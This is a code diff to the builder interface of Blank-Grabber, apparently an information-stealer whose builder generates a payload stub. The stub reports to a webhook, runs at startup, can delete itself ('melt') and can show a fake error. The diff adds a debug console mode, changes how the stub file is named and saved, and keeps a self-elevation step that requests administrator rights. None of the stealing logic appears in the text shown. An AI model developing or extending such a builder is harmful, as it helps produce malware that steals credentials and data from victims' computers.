@@ -164,7 +164,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.iconBytes = ""
 
 		self.OutputAsExe = True
-		self.ForceConsole = False
+		self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
 
 		for i in range(6):
 			self.rowconfigure(i, weight= 1)
@@ -298,12 +298,21 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		button.configure(text= EXEMODE if self.OutputAsExe else PYMODE)
 	
 	def consoleModeButton_Callback(self, button: ctk.CTkButton) -> None:
-		CONSOLEFORCE = "Console: Force"
-		CONSOLENONE = "Console: None"
+		CONSOLE_NONE = "Console: None"
+		CONSOLE_FORCE = "Console: Force"
+		CONSOLE_DEBUG = "Console: Debug"
 
-		self.ForceConsole = not self.ForceConsole
+		if self.ConsoleMode == 0:
+			self.ConsoleMode = 1
+			buttonText = CONSOLE_FORCE
+		elif self.ConsoleMode == 1:
+			self.ConsoleMode = 2
+			buttonText = CONSOLE_DEBUG
+		else:
+			self.ConsoleMode = 0
+			buttonText = CONSOLE_NONE
 
-		button.configure(text= CONSOLEFORCE if self.ForceConsole else CONSOLENONE)
+		button.configure(text= buttonText)
 	
 	def buildButton_Callback(self) -> None:
 		webhook = self.webhookVar.get().strip()
@@ -333,7 +342,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         		"startup" : self.startupVar.get(),
         		"melt" : self.meltVar.get(),
 				"archivePassword" : Utility.Password,
-				"hideconsole" : not self.ForceConsole
+				"consoleMode" : self.ConsoleMode,
+				"debug" : self.ConsoleMode == 2
     		},
     
     		"modules" : {
@@ -514,8 +524,6 @@ class Builder(ctk.CTk):
 		options: dict = json.loads(config)
 		excludeList = []
 
-		excludeList.append("Console Mode")
-
 		if options["modules"]["fakeError"][0]:
 			excludeList.append("Fake Error")
 		
@@ -536,8 +544,8 @@ class Builder(ctk.CTk):
 			if not messagebox.askyesno("Confirmation", message):
 				return
 		
-		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, defaultextension= ".py", filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub.py", title= "Save as")
-		if outPath is None:
+		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub" + (".py" if options["settings"]["consoleMode"] == 2 else ".pyw"), title= "Save as")
+		if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
 			return
 		
 		with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
@@ -557,7 +565,7 @@ class Builder(ctk.CTk):
 		except Exception: 
 			pass
 
-		code = "# pip install pyaesm pillow urllib3\n\n" + code
+		code = "# pip install pyaesm urllib3\n\n" + code
 
 		with open(outPath, "w") as file:
 			file.write(code)
@@ -641,7 +649,7 @@ if __name__ == "__main__":
 				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
 				exit(0)
 	
-		Utility.ToggleConsole(False)
+		# Utility.ToggleConsole(False) # To print any error occured
 		
 		if not Utility.IsAdmin():
 			ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
